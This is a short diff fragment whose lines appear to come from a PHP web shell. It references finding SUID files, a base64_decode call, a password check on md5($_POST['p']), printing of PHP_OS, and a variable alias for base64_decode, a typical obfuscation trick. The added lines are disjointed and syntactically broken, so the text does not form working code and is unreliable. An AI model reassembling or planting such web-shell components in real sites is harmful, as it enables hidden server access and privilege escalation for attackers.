@@ -9,3 +9,8 @@ find suid files in current dir
 column_title('permission',
 base64_decode('Ly
 md5($_POST['p'])
+) { echo PHP_OS
+; } return $
+;/*$
+="base64_decode";return
+fwrite($fp,"\xEF\xBB\xBF"
